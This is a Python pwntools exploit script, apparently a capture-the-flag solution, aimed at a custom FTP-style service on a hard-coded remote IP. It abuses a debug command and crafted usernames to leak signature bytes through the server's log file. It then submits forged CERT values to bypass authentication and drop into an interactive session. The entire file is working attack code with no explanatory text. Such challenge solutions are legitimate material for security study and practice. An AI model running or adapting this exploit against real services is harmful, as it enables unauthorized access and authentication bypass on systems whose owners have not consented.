from pwn import *
import time
import binascii

REMOTE = True
local_pasv = 33344



payload_leak =b"anonanonanonanon"


if REMOTE:
    p = remote("62.210.131.87", 31337)
else:
    p = remote("127.0.0.1" , 31337)

p.sendline(b"USER anon\n")
time.sleep(0.5)

print(p.recvuntil(b"need password\n").decode())
p.sendline(b"PASS anon\n")
time.sleep(0.5)

print(p.recvuntil(b"successful\n").decode())

p.sendline(b"DBG\n")
time.sleep(0.5)

p.sendline(b"USER %s" % payload_leak)


print(p.recvuntil(b"Invalid username\n").decode())

p.sendline(b"USER anon\n")
time.sleep(0.5)

print(p.recvuntil(b"need password\n").decode())
p.sendline(b"PASS anon\n")
time.sleep(0.5)

print(p.recvuntil(b"successful\n").decode())


p.sendline(b"PASV\n")
time.sleep(0.5)
print(p.recvuntil(b"passive mode").decode())

passive_param = p.recvline().decode().strip().replace("(","").replace(")","").split(",")
p1 = int(passive_param[-2])
p2 = int(passive_param[-1])
if REMOTE:
    pasv = remote("62.210.131.87", (p1*256)+p2)
else:
    pasv = remote("127.0.0.1", 33344)

p.sendline(b"RETR ftp.log")

time.sleep(0.5)

print(p.recvuntil(b"Send ok").decode())

print(pasv.recvuntil(payload_leak))
print(pasv.recvuntil(payload_leak))

leak = pasv.recvline()
print(leak)
leak = leak.split(b":")[0]
leak = leak[0:len(leak)-1]
leak_hex = binascii.hexlify(leak)
print(f"LEAK = {leak_hex}")
print(f"SIGUSER (anon +1) = {leak_hex[0:16]}")

print(pasv.recvuntil(b"ftp.log"))

pasv.close()
time.sleep(2)

p.sendline("CERT dXNlcj1hbm9ueW1vdXMmcGVybXM9MSZzaWc9JZwSUYC422Y=".encode())

time.sleep(0.5)
print(p.recvuntil(b"Invalid signature\n"))

p.sendline(b"USER anonymous\n")
time.sleep(0.5)

print(p.recvuntil(b"need password\n").decode())
p.sendline(b"PASS anonymous\n")
time.sleep(0.5)

print(p.recvuntil(b"successful\n").decode())


payload_leak =b"anonymousaaaaaaaaaaaaaaaa"

p.sendline(b"USER %s" % payload_leak)


print(p.recvuntil(b"Invalid username\n").decode())

p.sendline(b"PASS anonymous\n")

print(p.recvuntil(b"successful\n").decode())


p.sendline(b"PASV\n")
time.sleep(0.5)
print(p.recvuntil(b"passive mode").decode())

passive_param = p.recvline().decode().strip().replace("(","").replace(")","").split(",")
p1 = int(passive_param[-2])
p2 = int(passive_param[-1])
if REMOTE:
    pasv = remote("62.210.131.87", (p1*256)+p2)
else:
    pasv = remote("127.0.0.1", 33344)

p.sendline(b"RETR ftp.log")

time.sleep(0.5)

print(p.recvuntil(b"Send ok").decode())

print(pasv.recvuntil(payload_leak))

print(pasv.recvline())


pasv.recvuntil("anonymousaaaaaaa")
leak = pasv.recvline()

leak = leak.split(b":")[0]
leak = leak[0:len(leak)-1]
leak_hex_2 = binascii.hexlify(leak)
print(f"LEAK = {leak_hex_2}")
print(f"SIGUSER (anonymous +1) = {leak_hex_2[0:16]}")

L1 = leak_hex[0:16].decode()
L2 = leak_hex_2[0:16].decode()

L1_i = ""
L2_i = ""

for i in range(0,16,2):
	L1_i += L1[16-i-2: 16-i]

for i in range(0,16,2):
	L2_i += L2[16-i-2: 16-i]
	
print("anon LEAK1 / anon LEAK 2 -> ", L1_i, L2_i)


cert=input("cert>")
p.sendline(cert.encode())
print(p.recvline())
a = p.recvline()
if b"Ok" in a:
	p.interactive()
cert=input("cert>")
p.sendline(cert.encode())
a = p.recvline()
if b"Ok" in a:
	p.interactive()
cert=input("cert>")
p.sendline(cert.encode())
a = p.recvline()
if b"Ok" in a:
	p.interactive()
cert=input("cert>")
p.sendline(cert.encode())
print(p.recvline())
cert=input("cert>")
p.sendline(cert.encode())
a = p.recvline()
if b"Ok" in a:
	p.interactive()
cert=input("cert>")
p.sendline(cert.encode())
a = p.recvline()
if b"Ok" in a:
	p.interactive()
cert=input("cert>")
p.sendline(cert.encode())
a = p.recvline()
if "Ok" in a:
	p.interactive()
cert=input("cert>")
p.sendline(cert.encode())
a = p.recvline()
if b"Ok" in a:
	p.interactive()